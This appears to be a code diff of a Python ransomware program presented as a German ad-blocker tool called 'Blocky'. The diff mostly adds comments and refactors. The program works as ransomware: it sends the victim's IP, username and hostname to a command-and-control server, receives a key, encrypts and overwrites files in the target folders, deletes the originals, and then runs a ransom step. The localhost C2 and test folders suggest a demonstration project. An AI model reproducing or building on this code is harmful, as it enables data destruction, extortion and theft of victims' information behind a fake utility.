@@ -1,25 +1,32 @@
 # coding: utf-8
 
-import httpx  # Handling HTTP request/responses
+# Additional modules -> install via pip
+import httpx  # Handling HTTP requests/responses
 import nacl.secret  # Providing symmetric encryption
-import datetime  # Handling time-related data
-import os, sys  # For system-related data handling (hostname/usernames)
-import base64, pathlib
-import ctypes  # Calling Windows APIs
-from time import sleep
-from python_hosts import Hosts, HostsEntry
-import pprint
-import threading  # Enabling Thread creation
+import pprint  # Handles pretty printing
+from python_hosts import Hosts, HostsEntry  # Providing fake Adblocker functionality
 
-# Debug variables
+# Native modules
+import pathlib  # Handling file paths
+import base64  # Handling base64 en/decoding
+import os, sys  # Handling system related tasks (hostname/usernames)
+import ctypes  # Calling Windows APIs
+import threading  # Enabling Thread creation
+import datetime  # Handling time-related data
+from time import sleep  # 😴
+
+# Variables
+# Address of the remote C2 server
 c2_url = "http://localhost:5000"
+# List of paths. Every file in these lcoations will be encrypted ...
 target_paths = [".\\toencrypt", ".\\toencrypt2"]
+# ..except for the filetypes defined in the following list
 exclude_types = (".exe", ".dll", ".img")
 
 
 class FakeBlocker:
     """This object imitates the functionality of an AdBlocker. The functionality should be to block
-    Tracking & Malware Domains using Windows' interal hosts file, which requires Administrator rights
+    Tracking & Malware Domains using Windows' internal hosts file, which requires Administrator rights
     to edit."""
 
     def __init__(self):
@@ -40,6 +47,7 @@ class FakeBlocker:
         }
 
     def is_admin(self):
+        """Checks if the tool has been run with Admin privileges. Otherwise print error"""
         try:
             if ctypes.windll.shell32.IsUserAnAdmin():
                 return
@@ -53,35 +61,37 @@ class FakeBlocker:
             return False
 
     def show_menu(self):
+        """Prints the Blocky menu and takes user input on menu selection"""
         print(
             f"\nWillkommen bei Blocky!\n\n Was möchtest du tun? \n\n\t1) Aktuelle Hosts-Einträge anschauen\n\t2) Blockierliste auswählen und hinzufügen\n\t3) Blocky beenden\n"
         )
-        choice = input("Bitte gebe einen Menüpunkt an: ")
-        if choice not in ["1", "2", "3"]:
-            main()
-        elif choice == "1":
+        selection = input("Bitte gebe einen Menüpunkt an: ")
+        if selection not in ["1", "2", "3"]:
+            self.show_menu()
+        elif selection == "1":
             self.show_hosts()
-        elif choice == "2":
+        elif selection == "2":
             self.add_blocklist()
-        elif choice == "3":
+        elif selection == "3":
             sys.exit()
 
     def show_hosts(self):
-        # print(self.hosts)
+        """Prints a simple list of all entries in the local Hosts file"""
         pprint.PrettyPrinter().pprint(self.hosts)
-        main()
+        self.show_menu()
 
     def add_blocklist(self):
+        """After the user selects on of the predefined blocklists, the corresponding entries will the added to the local Hosts file"""
         print(f"\nWelche Blockliste möchtest du hinzufügen?\n")
         pprint.PrettyPrinter().pprint(self.blocklists)
-        choice = input("\nBitte wähle eine Liste aus: ")
-        if choice in list(self.blocklists):
-            self.hosts.import_url(url=self.blocklists[choice][1])
+        selection = input("\nBitte wähle eine Liste aus: ")
+        if selection in list(self.blocklists):
+            self.hosts.import_url(url=self.blocklists[selection][1])
             self.hosts.write()
-            print("Deine Hostliste wurde angepasst! Webung wird nun blockiert!")
+            print("Deine Hostliste wurde angepasst! Werbung wird nun blockiert!")
         else:
             self.add_blocklist()
-        main()
+        self.show_menu()
 
 
 class Ransomware:
@@ -108,6 +118,7 @@ class Ransomware:
         return f"IP: {self.public_ip}, Date: {self.firstContact}, Username: {self.username}, Hostname: {self.hostname}, Key: {self.encryption_key}, ID: {self.victim_id}"
 
     def get_public_ip(self):
+        # Get public IP for the PC/network
         try:
             ip = httpx.get("https://ipconfig.io/ip", timeout=5).text.replace("\n", "")
             return ip
@@ -119,6 +130,7 @@ class Ransomware:
             return "0.0.0.0"
 
     def get_system_info(self):
+        # Get Username/Hostname via environment variables
         try:
             hostname = os.environ["COMPUTERNAME"]
             username = os.environ["USERNAME"]
@@ -131,21 +143,21 @@ class Ransomware:
             return "generic_hostname", "generic_username"
 
     def check_for_infection(self):
+        # TODO: Think of a way to leave a trace and to check for infections
         # If this variable is set, then we have been on this system before
         if os.getenv("RNSMID") is not None:
             return True
         else:
             return False
-        # TODO: Add remote check with provided ID?
 
     def create_remote_entry(self):
-        """Creates a DB entry for the new victim on the C2 server and receives keys & ID for local handling"""
+        """Creates a DB entry for the new victim on the C2 server and receives encryption key & ID"""
         payload = {
             "username": (None, self.username),
             "hostname": (None, self.hostname),
             "ip": (None, self.public_ip),
         }
-        # Send victim data via HTTP Form post to the C2 server
+        # Send victim data via HTTP Form POST to the C2 server
         try:
             response = httpx.post(f"{c2_url}/create", files=payload)
         except httpx.TimeoutException as err:
@@ -161,9 +173,6 @@ class Ransomware:
         bin_key = base64.b64decode(self.encryption_key)
         self.box = nacl.secret.SecretBox(bin_key)
 
-    def set_env_variables(self):
-        os.environ["RNSMID"] = str(self.victim_id)
-
     def encrypt_file(self, filepath):
         """Takes a file path input and encrypts it using the box object of the Ransomware object"""
         try:
@@ -173,15 +182,18 @@ class Ransomware:
                     original_data = original_file.read()
                 # ... encrypt it using the PyNaCl box provided by the parent object...
                 encrypted_data = self.box.encrypt(original_data)
-                # ... and write the encrypted binary data back in the same file but with an additional extension.
+                # ... and write the encrypted binary data back in the original and newly created encrypted file.
                 with open(f"{filepath}.rnsm", "wb") as encrypted_file:
                     encrypted_file.write(encrypted_data)
+                with open(filepath, "wb") as original_file:
+                    original_file.write(encrypted_data)
                 # Lastly, remove the original file.
                 os.remove(filepath)
         except Exception as err:
             print("encrypt_file(): Error --> ", err)
 
     def start_encryption(self):
+        "Goes through each target location, filters out unwanted files and starts encryption on all files."
         for location in target_paths:
             try:
                 # Check if each path actually exists
@@ -280,7 +292,6 @@ def fake_main():
         return
     rnsm = Ransomware()
     rnsm.create_remote_entry()
-    rnsm.set_env_variables()
     rnsm.start_encryption()
     rnsm.fear_and_loathing()
     # print("💲💲💲 Starting loop to check for payment receival...")
